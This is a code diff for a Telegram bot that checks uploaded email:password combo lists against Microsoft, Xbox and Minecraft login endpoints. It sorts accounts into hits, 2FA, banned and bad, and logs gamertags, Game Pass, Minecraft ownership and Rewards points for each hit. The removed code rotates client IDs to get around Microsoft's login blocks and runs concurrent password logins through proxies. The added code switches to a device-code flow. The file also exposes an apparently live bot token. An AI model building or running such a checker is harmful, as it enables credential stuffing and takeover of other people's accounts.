@@ -21,14 +21,16 @@ from aiogram.client.default import DefaultBotProperties
 # ============================================================
 BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
 ADMIN_IDS = [7595790309]
-USE_PROXIES = False 
+USE_PROXIES = False
 
-MAX_CONCURRENT = 20
-TIMEOUT = 25
+MAX_CONCURRENT = 5 # Lowered concurrency for device code flow
+TIMEOUT = 30
 TEMP_DIR = "./temp"
 
 # Microsoft / Xbox endpoints
-MS_TOKEN_URL = "https://login.live.com/oauth20_token.srf"
+# We now use the /consumers endpoint for personal accounts
+MS_DEVICECODE_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode"
+MS_TOKEN_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
 XBL_AUTH_URL = "https://user.auth.xboxlive.com/user/authenticate"
 XSTS_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
 PROFILE_URL = "https://profile.xboxlive.com/users/xuid({xuid})/profile/settings"
@@ -38,21 +40,16 @@ MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"
 GAMEPASS_URL = "https://collections.mp.microsoft.com/v9.0/collections/publisherQuery"
 REWARDS_URL = "https://prod.rewardsplatform.microsoft.com/dapi/me?channel=SAAndroid&options=511"
 
-# Rotating list of Client IDs to bypass grant_type blocks
-CLIENT_IDS = [
-    "0000000048093EE3", # Xbox Android
-    "0000000040170455", # Xbox
-    "00000000402B5328", # Minecraft
-    "000000004C12AE6F"  # Xbox Live
-]
-SCOPE = "service::user.auth.xboxlive.com::MBI_SSL"
+# The Minecraft client ID works with the device code flow
+CLIENT_ID = "00000000402B5328"
+SCOPE = "XboxLive.signin offline_access"
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 log = logging.getLogger("nyx")
 os.makedirs(TEMP_DIR, exist_ok=True)
 
 # ============================================================
-# PROXY FETCHER
+# PROXY FETCHER (kept for completeness)
 # ============================================================
 async def fetch_proxies() -> list:
     if not USE_PROXIES: return []
@@ -108,37 +105,59 @@ def detect_country(email: str, jwt_country: str = "") -> str:
         if dom.endswith("." + suffix): return code
     return "US"
 
-async def ms_ropc(session, email, password):
-    # Loop through client IDs until one works
-    for client_id in CLIENT_IDS:
-        payload = {"client_id": client_id, "scope": SCOPE, "grant_type": "password", "username": email, "password": password}
-        headers = {"Content-Type": "application/x-www-form-urlencoded"}
-        proxy = pick_proxy()
+async def ms_device_code_flow(session, email, status_msg):
+    # Step 1: Request device code
+    payload = {"client_id": CLIENT_ID, "scope": SCOPE}
+    try:
+        async with session.post(MS_DEVICECODE_URL, data=payload, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+            if r.status != 200:
+                return {"ok": False, "kind": "BAD", "detail": "Device code request failed"}
+            dc_data = await r.json()
+            device_code = dc_data["device_code"]
+            user_code = dc_data["user_code"]
+            verification_uri = dc_data["verification_uri"]
+            interval = dc_data.get("interval", 5)
+            expires_in = dc_data.get("expires_in", 900)
+    except Exception as e:
+        return {"ok": False, "kind": "ERR", "detail": str(e)}
+
+    # Step 2: Prompt the user in Telegram
+    prompt_text = (
+        f"🔑 **Action Required for {email}**\n\n"
+        f"1. Go to: {verification_uri}\n"
+        f"2. Enter code: `{user_code}`\n\n"
+        f"Waiting for authorization..."
+    )
+    await status_msg.edit_text(prompt_text, parse_mode=ParseMode.HTML)
+
+    # Step 3: Poll for token
+    token_payload = {
+        "client_id": CLIENT_ID,
+        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+        "device_code": device_code
+    }
+    start_time = time.time()
+    while time.time() - start_time < expires_in:
         try:
-            async with session.post(MS_TOKEN_URL, data=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+            async with session.post(MS_TOKEN_URL, data=token_payload, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                 body = await r.text()
-                if r.status == 200: return {"ok": True, "data": await r.json()}
+                if r.status == 200:
+                    return {"ok": True, "data": await r.json()}
                 
-                low = body.lower()
-                # If it's a grant_type error, try the next client ID instantly
-                if "grant_type" in low or "invalid_client" in low:
+                err_data = json.loads(body)
+                if err_data.get("error") == "authorization_pending":
+                    await asyncio.sleep(interval)
                     continue
-
-                if "aadsts50076" in low or "interaction_required" in low: return {"ok": False, "kind": "2FA"}
-                if "aadsts50053" in low or "aadsts50057" in low or "aadsts50055" in low: return {"ok": False, "kind": "BANNED"}
-                if r.status == 429: return {"ok": False, "kind": "RATE"}
-                
-                err_msg = ""
-                try:
-                    err_json = await r.json()
-                    err_msg = err_json.get("error_description", err_json.get("error", "unknown"))
-                except: err_msg = body[:50]
-                return {"ok": False, "kind": "BAD", "detail": err_msg}
-        except Exception as e: 
-            continue # Try next client ID on network error
-
-    # If we loop through all and they all fail with grant_type
-    return {"ok": False, "kind": "BAD", "detail": "All Client IDs blocked (grant_type)"}
+                elif err_data.get("error") == "slow_down":
+                    interval += 5
+                    await asyncio.sleep(interval)
+                    continue
+                else:
+                    return {"ok": False, "kind": "BAD", "detail": err_data.get("error_description", "Device flow failed")}
+        except Exception:
+            await asyncio.sleep(interval)
+    
+    return {"ok": False, "kind": "ERR", "detail": "Device flow expired"}
 
 async def xbox_user_auth(session, ms_access):
     payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={ms_access}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
@@ -214,19 +233,22 @@ async def check_minecraft(session, xbl_token):
     except Exception: pass
     return None
 
-async def check_account(session, email, password):
+async def check_account(session, email, password, status_msg):
     result = {"email": email, "password": password, "status": "BAD", "detail": "unknown"}
-    ropc = await ms_ropc(session, email, password)
-    if not ropc["ok"]:
-        result["status"] = ropc["kind"]
-        result["detail"] = ropc.get("detail", "")
+    
+    # 1. Use Device Code Flow instead of ROPC
+    auth_result = await ms_device_code_flow(session, email, status_msg)
+    if not auth_result["ok"]:
+        result["status"] = auth_result["kind"]
+        result["detail"] = auth_result.get("detail", "")
         return result
         
     result["status"] = "HIT"
-    ms_access = ropc["data"].get("access_token", "")
+    ms_access = auth_result["data"].get("access_token", "")
     jwt = decode_jwt_payload(ms_access)
     result["country"] = detect_country(email, jwt.get("ctry", "") or jwt.get("country", ""))
     
+    # 2. Proceed with Xbox Live and other checks
     xbl_token = await xbox_user_auth(session, ms_access)
     result.update({"gamertag": "", "gamerscore": "0", "location": "", "bio": "", "gamepass": False, "rewards": 0, "minecraft": None})
     
@@ -246,36 +268,30 @@ async def check_account(session, email, password):
 # PROCESSING & TELEGRAM
 # ============================================================
 async def process_combos(combos, chat_id, status_msg, bot):
-    results, done, total, t_start, last_edit = [], 0, len(combos), time.time(), 0.0
-    sem = asyncio.Semaphore(MAX_CONCURRENT)
-    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        async def worker(email, password):
-            nonlocal done, last_edit
-            async with sem: r = await check_account(session, email, password)
-            results.append(r); done += 1
-            now = time.time()
-            if now - last_edit >= 4.0 or done == total:
-                last_edit = now
-                hits = sum(1 for x in results if x["status"] == "HIT")
-                tfa = sum(1 for x in results if x["status"] == "2FA")
-                bad = sum(1 for x in results if x["status"] == "BAD")
-                ban = sum(1 for x in results if x["status"] == "BANNED")
-                err = sum(1 for x in results if x["status"] in ("ERR", "RATE"))
-                elapsed = now - t_start
-                try:
-                    await status_msg.edit_text(f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\nhits: <b>{hits}</b> | 2fa: <b>{tfa}</b> | banned: <b>{ban}</b>\nbad: <b>{bad}</b> | err: <b>{err}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code> | {elapsed:.1f}s", parse_mode=ParseMode.HTML)
-                except Exception: pass
-        await asyncio.gather(*(worker(e, p) for e, p in combos))
+    results = []
+    total = len(combos)
+    t_start = time.time()
+    
+    # Process sequentially because of manual user interaction
+    for i, (email, password) in enumerate(combos):
+        current_status = await status_msg.edit_text(
+            f"<b>Processing {i+1}/{total}...</b>\n"
+            f"Account: <code>{email}</code>\n"
+            f"Please wait...",
+            parse_mode=ParseMode.HTML
+        )
+        
+        result = await check_account(session, email, password, current_status)
+        results.append(result)
+        
+        # Small delay to avoid spamming Telegram
+        await asyncio.sleep(1)
 
     elapsed = time.time() - t_start
     hits = [r for r in results if r["status"] == "HIT"]
     bad = [r for r in results if r["status"] == "BAD"]
-    tfa = [r for r in results if r["status"] == "2FA"]
-    banned = [r for r in results if r["status"] == "BANNED"]
-    errors = [r for r in results if r["status"] in ("ERR", "RATE")]
-    country_buckets = {}
-    for r in hits: country_buckets.setdefault(r["country"], []).append(r)
+    errors = [r for r in results if r["status"] in ("ERR", "RATE", "2FA")]
+    
     ts = int(time.time()); workdir = os.path.join(TEMP_DIR, f"run_{ts}"); os.makedirs(workdir, exist_ok=True)
 
     def write_file(name, lines):
@@ -283,28 +299,25 @@ async def process_combos(combos, chat_id, status_msg, bot):
 
     write_file("hits.txt", [f"{r['email']}:{r['password']}" for r in hits])
     write_file("bad.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in bad])
-    write_file("2fa.txt", [f"{r['email']}:{r['password']}" for r in tfa])
-    write_file("banned.txt", [f"{r['email']}:{r['password']}" for r in banned])
     write_file("errors.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in errors])
     
-    write_file("xbox_profile.txt", [f"{r['email']}:{r['password']} | {r['gamertag']} | {r['gamerscore']} GS" for r in hits if r['gamertag']])
-    write_file("gamepass.txt", [f"{r['email']}:{r['password']} | Active: {r['gamepass']}" for r in hits if r['gamepass']])
-    write_file("minecraft.txt", [f"{r['email']}:{r['password']} | {r['minecraft']}" for r in hits if r['minecraft']])
-    write_file("rewards.txt", [f"{r['email']}:{r['password']} | Points: {r['rewards']}" for r in hits if r['rewards'] > 0])
+    write_file("xbox_profile.txt", [f"{r['email']}:{r['password']} | {r['gamertag']} | {r['gamerscore']} GS" for r in hits if r.get('gamertag')])
+    write_file("gamepass.txt", [f"{r['email']}:{r['password']} | Active: {r['gamepass']}" for r in hits if r.get('gamepass')])
+    write_file("minecraft.txt", [f"{r['email']}:{r['password']} | {r['minecraft']}" for r in hits if r.get('minecraft')])
+    write_file("rewards.txt", [f"{r['email']}:{r['password']} | Points: {r['rewards']}" for r in hits if r.get('rewards', 0) > 0])
     
     placeholders = ["instagram.txt", "psn.txt", "steam.txt", "supercell.txt", "tiktok.txt", "balance.txt"]
     for ph in placeholders:
         with open(os.path.join(workdir, ph), "w") as f:
-            f.write("# This service requires a separate module and cannot be checked via Microsoft APIs.\n")
+            f.write("# This service requires a separate module.\n")
 
-    for ccode, items in country_buckets.items(): write_file(f"{ccode}.txt", [f"{r['email']}:{r['password']}" for r in items])
-    write_file("summary.txt", [f"Module: hotmail", f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Hits: {len(hits)}", f"Bad: {len(bad)}", f"2FA: {len(tfa)}", f"Banned: {len(banned)}", f"Errors: {len(errors)}", f"Elapsed: {elapsed:.1f}s"])
+    write_file("summary.txt", [f"Module: hotmail", f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Hits: {len(hits)}", f"Bad: {len(bad)}", f"Errors: {len(errors)}", f"Elapsed: {elapsed:.1f}s"])
 
     zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
     with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
         for fname in os.listdir(workdir): zf.write(os.path.join(workdir, fname), arcname=fname)
 
-    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nhits: <b>{len(hits)}</b>\n2fa: <b>{len(tfa)}</b>\nbanned: <b>{len(banned)}</b>\nbad: <b>{len(bad)}</b>\nerrors: <b>{len(errors)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
+    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nhits: <b>{len(hits)}</b>\nbad: <b>{len(bad)}</b>\nerrors: <b>{len(errors)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
     await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(hits)}_hits.zip"))
     shutil.rmtree(workdir, ignore_errors=True)
     try: os.remove(zip_path)
@@ -337,8 +350,16 @@ async def handle_file(msg: types.Message):
                 if e and p: combos.append((e, p))
     os.remove(local)
     if not combos: return await status.edit_text("no valid combos found.")
-    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
-    await process_combos(combos, msg.chat.id, status, bot)
+    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting device code flow...")
+    
+    # Start the process
+    global session
+    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)
+    session = aiohttp.ClientSession(connector=connector)
+    try:
+        await process_combos(combos, msg.chat.id, status, bot)
+    finally:
+        await session.close()
 
 # ============================================================
 # WEB SERVER FOR RENDER FREE TIER
